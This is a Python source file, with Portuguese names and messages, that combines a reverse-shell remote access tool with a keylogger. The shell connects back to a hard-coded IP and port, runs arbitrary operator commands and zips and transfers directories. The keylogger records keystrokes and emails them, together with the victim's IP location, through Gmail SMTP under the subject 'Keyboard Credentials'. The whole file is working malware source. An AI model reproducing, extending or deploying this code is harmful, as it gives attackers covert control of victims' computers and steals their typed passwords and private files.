from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from threading import Timer
from datetime import datetime
import socket
import threading
import time
import subprocess
import os
import zipfile
import requests
import platform
import smtplib



ip = '127.0.0.2'
port = 8989

timestamp = time.time()
TIME = datetime.fromtimestamp(timestamp)
data_day = TIME.ctime()


def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            send_data(s, data_day)
            s.send(b"\n\n[!] Connection received.\n")
            return s
            
        except socket.error as e:
            print("Connection error:", e)
            time.sleep(10)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                break
            if data[:-1].decode() == "quit":
                s.close()
                break
            else:
                cmd(s, data[:-1].decode())
    except Exception as e:
        print("Error in listen:", e)


def cmd(s, data):
    try:
        if data.startswith("help") or data.startswith("-h"):
            help_text = """\n##########
Manual:
-[help or -h] - Open the manual code;
-[execute] - to execute commands with a message returned for you;
-[cd or Cd] - to change directory;
-[cls or clear] - to clean the terminal;
-[ls or dir] - to list files;
-[info_ip] - to see IP addresses.
-[Download] - Download mode for files from the server(make shure you are using the client.py file to connect on 8887 port);
-[Upload] - to upload files from your computer(make shure you are using the server.py listening on 8889 port and the same address).
-[nmap_install] - Nmap installation for ip addresses scan.
-[quit] - Exit.
##########\n\n"""
            send_data(s, help_text)

        elif data.startswith("execute"):
            command = data.split(" ", 1)[1]
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

        elif data.startswith("cd") or data.startswith("Cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Directory changed successfully.\n")

        elif data.startswith("ls"):
            output = subprocess.run("dir",shell=True,check=True, capture_output=True, text=True)
            send_data(s,output.stdout)

        elif data.startswith("Download"):
            server(s)

        elif data.startswith("Upload"):
            client_path(s)

        elif data.startswith("info_ip"):
            obter_informacoes_ip(s)

        elif data.startswith("nmap_install"):
            install_nmap(s)

        elif data.startswith("cls") or data.startswith("clear"):
            clear_screen(s)

        else:
            output = subprocess.run(data, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

    except Exception as e:
        print("Error in cmd:", e)


def send_data(s, data):
    s.send(data.encode())

def compactar_diretorio(diretorio, arquivo_saida):
    with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
        for raiz, _, arquivos in os.walk(diretorio):
            for arquivo in arquivos:
                caminho_completo = os.path.join(raiz, arquivo)
                relativo = os.path.relpath(caminho_completo, diretorio)
                zipf.write(caminho_completo, relativo)

def clear_screen(s):
    s.send(b"\n" * 100)

def client_path(s):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.send(b"\n[!] Trying connection with the server...\n")
        client.connect(('127.0.0.2', 8080))
        print('Connected [!]\n')

        s.send(b"\n[!] Connection Received from the server.\n ")
        time.sleep(2)

        s.send(b"Enter the directory to zip> ")
        directory_name = s.recv(1024).decode().strip()
        client.send(directory_name.encode())

        with open('received_directory.zip', 'wb') as file:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                file.write(data)

        s.send(b'\n[+] File received as received_file.zip [ok]\n')
        client.close()
        s.send(b"\n[-] Server closed\n")

    except ConnectionRefusedError as e:
        print("\nConnection error: ", e)
        return
    except Exception as e:
        print("\nConnection error: ", e)
    except KeyboardInterrupt:
        print("\nConnection closed by the client...\n")


def clear_zip():
    zip = "received_directory.zip"
    if os.path.isfile(zip):
        os.remove(zip)

def server(s):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server.bind(('0.0.0.0', 8887)) #listening on 0.0.0.0 all interfaces.
        server.listen(1)

        s.send(b'\n[!] Waiting for a connection...\n')
        connection, address = server.accept()
        print(f'Connection from {address}')

        s.send(b"\n[!] Connection received! \n")
        diretorio_cliente = connection.recv(1024).decode()

        if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
            print(f"Directory '{diretorio_cliente}' does not exist or is not a directory.")
            s.send(b"\n[!] Directory does not exist or is not a directory!\n")
            connection.close()
            server.close()
            s.send(b"\n[-] Server closed\n")
            return
            

        arquivo_zip_saida = 'received_directory.zip'

        compactar_diretorio(diretorio_cliente, arquivo_zip_saida)

        if os.path.getsize(arquivo_zip_saida) == 0:
            print(f"\nFailed to create ZIP file for directory '{diretorio_cliente}'.\n")
            s.send(b"\n[!] Failed to create ZIP file for directory.\n")
            connection.close()
            server.close()
            s.send(b"\n[-] Server closed\n")
            return

        with open(arquivo_zip_saida, 'rb') as file:
            while True:
                data = file.read(4096)  
                if not data:
                    break
                connection.sendall(data) 

        s.send(b'\n[+] ZIP file sent.\n')
        server.close()
        s.send(b"\n[-] Server closed\n")
        clear_zip()
    except Exception as e:
        print("[ERROR] Failure: ",e)
        s.send(b'[ERROR] Failure on the server.\n')

def obter_informacoes_ip(s):
    try:
        resposta = requests.get("https://ipinfo.io")
        if resposta.status_code == 200:
            dados_ip = resposta.json()
            info_string = (
                f"IP Público: {dados_ip['ip']}\n"
                f"Cidade: {dados_ip['city']}\n"
                f"Região: {dados_ip['region']}\n"
                f"País: {dados_ip['country']}\n"
                f"Provedor de Internet: {dados_ip['org']}\n"
            )

            s_local = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_local.connect(("8.8.8.8", 80))  
            ip_local = s_local.getsockname()[0]
            s_local.close()

            send_data(s, info_string) 
            send_data(s, f"IP Local: {ip_local}\n") 

        else:
            print(f"Falha na solicitação: {resposta.status_code}")
            error = "Error in your solicitation.\n"
            send_data(s, error) 

    except Exception as e:
        print(f"Erro ao obter informações do IP: {e}")
        error = "[ERROR] Solicitation error."
        send_data(s, error)

def install_nmap(s):
    system = platform.system()

    out = subprocess.run("nmap -v", shell=True, capture_output=True, text=True)

    if out.returncode == 0:
        s.send(b"\n[-] Nmap already installed.\n")
        return
    else:
        s.send(b"\n[!] Nmap not found. Starting installation...\n")

    if system == 'Windows':
        s.send(b"\n[!] Starting Nmap installation on Windows...\n")
        try:
            subprocess.run("winget install Insecure.Nmap", shell=True, check=True)
            s.send(b"\n[+] Nmap installation completed successfully.\n")
        except Exception as e:
            s.send(f"\n[!] Installation failed: {e}\n".encode())
            print(f"[!] Installation failed: {e}\n")
        
    elif system == "Linux":
        s.send(b"\n[!] Installing Nmap on Linux...\n")
        try:
            subprocess.run("sudo apt install nmap -y", shell=True, check=True)
            s.send(b"\n[+] Installation completed successfully.\n")
        except Exception as e:
            s.send(f"\n[!] Installation failed: {e}\n".encode())
            print(f"[!] Installation failed: {e}\n")
    else:
        s.send(b"\n[!] This operating system is not supported.\n")

def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                listen(s_connected)
            else:
                print("Connection was wrong, trying again.")
        except Exception as e:
            print("Main error: ", e)
            time.sleep(10)

    


##### KEYLOGGER #####

def iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject, tempo_maximo=60):
    teclas = []
    tempo_inicial = time.time()  
    num_zip = 1
    num_txt = 1  

    def processar_tecla(tecla):
        if hasattr(tecla, 'char'):
            return tecla.char
        elif tecla == Key.space:
            return ' '
        else:
            return str(tecla)

    def log(tecla):
        nonlocal num_zip, num_txt
        tecla_processada = processar_tecla(tecla)
        if tecla_processada is not None:
            teclas.append(tecla_processada)
            if time.time() - tempo_inicial >= tempo_maximo:
                encerrar_keylogger(num_zip, num_txt)  

    def obter_informacoes_ip():
        try:
            resposta = requests.get("https://ipinfo.io")

            if resposta.status_code == 200:
                dados_ip = resposta.json()

                info_string = f"IP Público: {dados_ip['ip']}\n"
                info_string += f"Cidade: {dados_ip['city']}\n"
                info_string += f"Região: {dados_ip['region']}\n"
                info_string += f"País: {dados_ip['country']}\n"
                info_string += f"Provedor de Internet: {dados_ip['org']}\n"

                return info_string
            else:
                return f"Falha na solicitação: {resposta.status_code}"

        except Exception as e:
            return f"Erro ao obter informações do IP: {e}"

    def send_email(body):
        try:
            smtp_server = "smtp.gmail.com"
            smtp_port = 587

            mensagem = MIMEMultipart()
            mensagem['From'] = remetente_email
            mensagem['To'] = destinatario_email
            mensagem['Subject'] = subject

            mensagem.attach(MIMEText(body, 'plain'))

            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(remetente_email, remetente_senha)
                server.send_message(mensagem)

            print("Email enviado com sucesso!")
            return True

        except Exception as e:
            print(f"Erro ao enviar e-mail: {e}")
            return False

    def encerrar_keylogger(num_zip, num_txt):
        resultado_teclas = ' '.join(teclas)
        info_data = obter_informacoes_ip()

        corpo_email = f"""##########

Keyboard: {resultado_teclas}

Informações de IP:
{info_data}

##########"""

        try:
            if not send_email(corpo_email):
                with open(f"settings{num_txt}.txt", "a") as arquivo:
                    arquivo.write(f"Erro ao enviar e-mail:\n{corpo_email}\n")

            if os.path.exists(f"settings{num_txt}.txt"):
                num_zip = 1
                num_txt = 1

                while os.path.exists(f"settings{num_zip}.zip"):
                    num_zip += 1

                # Cria o arquivo zip com o número
                with zipfile.ZipFile(f"settings{num_zip}.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
                    zipf.write(f"settings{num_txt}.txt")  

                os.remove(f"settings{num_txt}.txt")

                exit(0)
            else:
                print("O arquivo .txt não existe. Nenhum arquivo ZIP será criado.")
                exit(1)

        except Exception as e:
            print(f"Erro ao encerrar keylogger: {e}")
            exit(1)

    try:
        with Listener(on_press=log) as monitor:
            monitor.join()

    except (KeyboardInterrupt, AttributeError):
        print('Encerrando monitoramento...')
        encerrar_keylogger(num_zip, num_txt)


def executar_arquivo(remetente_email, remetente_senha, destinatario_email, subject):
    while True:
        try:
            print("#####Executando arquivos pendentes#####\n")
            time_now()
            timer = Timer(60, interromper_keylogger)  
            timer.start()  
        except KeyboardInterrupt:
            print("Encerrando a execução do arquivo.")
        try:
            iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject)
        except Exception:
            pass  

def interromper_keylogger():
    try:
        print("#####Interrompendo a execução. #####")
        raise KeyboardInterrupt  
    except (Exception, KeyboardInterrupt):
        print("\n#####Encerrando todos os processos...#####\n")  


def time_now():
    timestamp = time.time()
    TIME = datetime.fromtimestamp(timestamp)
    data_day = TIME.date()
    data_hour = TIME.time()
    print(f'\nTool executed at Hour: {data_hour} on Day: {data_day}.\n\n')


def iniciar_threads():
    remetente_email = 'teste2@gmailcom'
    remetente_senha = 'teste'
    destinatario_email = 'teste1@gmail.com'
    subject = "Keyboard Credentials"

    main_thread = threading.Thread(target=main)
    arquivo_thread = threading.Thread(target=executar_arquivo, args=(remetente_email, remetente_senha, destinatario_email, subject))

    main_thread.start()
    arquivo_thread.start()

    main_thread.join()
    arquivo_thread.join()

if __name__ == "__main__":
    iniciar_threads()
